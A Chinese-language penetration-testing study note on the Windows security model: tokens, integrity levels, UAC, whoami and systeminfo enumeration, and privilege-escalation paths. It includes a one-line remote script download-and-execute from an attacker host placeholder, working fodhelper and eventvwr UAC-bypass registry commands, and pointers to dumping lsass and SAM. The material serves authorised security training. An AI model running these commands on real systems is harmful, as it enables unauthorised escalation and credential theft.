# 第 81 章 - Windows 安全模型

## 標籤

- #cpts
- #chapter
- #windows
- #privilege-escalation

## 學習目標

- 理解 Windows 的存取控制模型（token、SID、ACL、integrity level）。
- 知道 UAC 的機制與繞過意義。
- 能用 whoami 系列指令快速摸清當前身份的完整權限輪廓。
- 判斷現在是本機帳號還是域帳號、是否有高完整性 token。

---

## 理論基礎：Windows 存取控制

Windows 用**Access Token**決定一個程序能做什麼。Token 包含：

| 成分 | 說明 |
|------|------|
| User SID | 使用者身份（S-1-5-21-...-RID）|
| Group SIDs | 所屬群組（包含 BUILTIN\Administrators 等）|
| Privileges | 特殊操作權限（SeDebugPrivilege / SeImpersonatePrivilege 等）|
| Integrity Level | 完整性等級（Low/Medium/High/System）|

**Integrity Level 是 PrivEsc 的關鍵**：
- Low → 沙箱（瀏覽器）
- Medium → 一般使用者程序
- High → 以管理員身份執行（UAC 提升後）
- System → NT AUTHORITY\SYSTEM

即使帳號是 Administrator，若 token 是 Medium integrity，很多操作仍然被阻擋。

---

## 理論基礎：UAC

UAC（User Account Control）讓管理員帳號預設以 Medium integrity 執行，需要確認才提升為 High。繞過 UAC 就是：讓你的程序以 High integrity 執行，而不觸發確認視窗。

UAC 繞過前提：
1. 你已是 Administrators 群組成員（否則就是提權，不是繞過）
2. Token 是 Medium integrity
3. UAC 等級不是最高（Always Notify）

---

## 快速身份確認（第一步必做）

```cmd
:: 基本身份資訊
whoami
:: 輸出：DOMAIN\username 或 COMPUTERNAME\username（本機帳號）

:: 完整群組列表（找 Administrators / 高價值群組）
whoami /groups
:: 重要群組：
:: BUILTIN\Administrators → 本機管理員
:: NT AUTHORITY\SYSTEM   → SYSTEM
:: DOMAIN\Domain Admins  → 域管理員
:: 注意 Mandatory Label\High Mandatory Level → 已是 High integrity

:: 只看 privilege（找可濫用的）
whoami /priv
:: 重要 privilege：
:: SeImpersonatePrivilege → Potato 系列
:: SeDebugPrivilege       → 可存取其他程序的記憶體（dump lsass）
:: SeBackupPrivilege      → 可讀任何檔案（讀 SAM/NTDS）
:: SeRestorePrivilege     → 可寫任何位置
:: SeTakeOwnershipPrivilege → 可搶奪檔案擁有權
:: SeLoadDriverPrivilege  → 可載入驅動程式（核心級提權）

:: 全部一起看
whoami /all
:: 輸出：使用者名稱 + 群組 + privilege（最全面）

:: 查系統資訊（OS 版本、hotfix 狀態）
systeminfo
:: 看 OS Name / OS Version → 判斷是否有核心漏洞
:: 看 Hotfix(s) → 判斷 patch 水平

:: 精簡版系統資訊
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"
:: /B → 只匹配行首
:: /C → 精確字串搜尋（可多個）
```

---

## 當前網路與使用者環境

```cmd
:: 查本機使用者
net user
:: 查特定使用者詳細資訊
net user USERNAME
:: 重點：Local Group Memberships / Password last set / Account active

:: 查本機群組
net localgroup
:: 查特定群組成員
net localgroup Administrators
:: 找非預設的管理員帳號（後門帳號）

:: 環境變數（找可利用路徑）
set
:: 重點：TEMP / PATH / USERNAME / COMPUTERNAME

:: 查當前登入的使用者（找高權使用者）
query user
:: 或
net sessions  :: 從管理員身份看所有 session

:: 查 PATH 是否有可劫持目錄
echo %PATH%
:: 若 PATH 包含使用者可寫的目錄，可以做 DLL/EXE hijacking
```

---

## 自動化工具

```powershell
# WinPEAS（Windows 提權一鍵掃描，最全面）
# 上傳到目標機器執行
.\winPEAS.exe
# 或 PowerShell 版本（不落地）
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/winPEASps1.ps1')

# Seatbelt（C# 工具，專注安全性配置枚舉）
.\Seatbelt.exe -group=all
# -group=all → 執行所有檢查類別
# -group=system → 只看系統相關
# -group=user   → 只看使用者相關

# PowerUp（PowerShell，專注服務/排程/登錄 misconfig）
Import-Module .\PowerUp.ps1
Invoke-AllChecks
# 輸出高亮顯示可利用的配置
```

---

## 判斷邏輯：現在是什麼身份，下一步打什麼

```
whoami /all 看完後：

當前是 SYSTEM / Domain Admin？
└── 直接找 flag，做持久化

當前是 local admin（Administrators 群組成員）但 Medium integrity？
└── UAC bypass → 取得 High integrity token

當前是普通使用者？
├── 有 SeImpersonatePrivilege → 第 85 章 Potato 系列
├── 有 SeDebugPrivilege       → dump lsass（第 86 章）
├── 有 SeBackupPrivilege      → 讀 SAM/NTDS（第 86 章）
└── 以上都沒有
    ├── 跑 winPEAS 找服務/排程/登錄 misconfig（第 83/84 章）
    └── 找可寫的 PATH 目錄 / DLL 劫持（第 83 章）
```

---

## UAC Bypass 快速執行

```powershell
# 方法一：fodhelper.exe（最穩定，Windows 10/11）
# 原理：fodhelper.exe 會以 High integrity 執行，且用 Registry 找要啟動的程式
# 把你的 payload 寫入 Registry → 執行 fodhelper → payload 以 High 啟動

New-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
  -Name "(default)" -Value "powershell.exe -nop -w hidden -c IEX..."
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
  -Name "DelegateExecute" -Value ""
# DelegateExecute 空值 → 觸發 UAC bypass 機制

Start-Process "C:\Windows\System32\fodhelper.exe"
# fodhelper 啟動時讀到你的 Registry，以 High integrity 執行你的 payload

# 方法二：eventvwr.exe（老但可靠）
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" `
  -Name "(default)" -Value "cmd.exe /c START powershell.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"

# 驗證提升成功
whoami /groups | findstr "High"
```

---

## 速查表

```cmd
:: 身份確認（第一步）
whoami /all

:: 找系統資訊
systeminfo | findstr /B /C:"OS" /C:"Hotfix"

:: 找本機管理員
net localgroup Administrators

:: 跑 winPEAS
.\winPEAS.exe

:: UAC bypass（fodhelper）
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe
```

---

## 關聯筆記

- [[82-本機列舉|第 82 章 - 本機列舉]]
- [[83-服務設定錯誤|第 83 章 - 服務設定錯誤]]
- [[85-權杖與權限濫用|第 85 章 - 權杖與權限濫用]]
- [[10-Volume-10-Windows-Privilege-Escalation-Index|Vol.10 - Windows PrivEsc]]
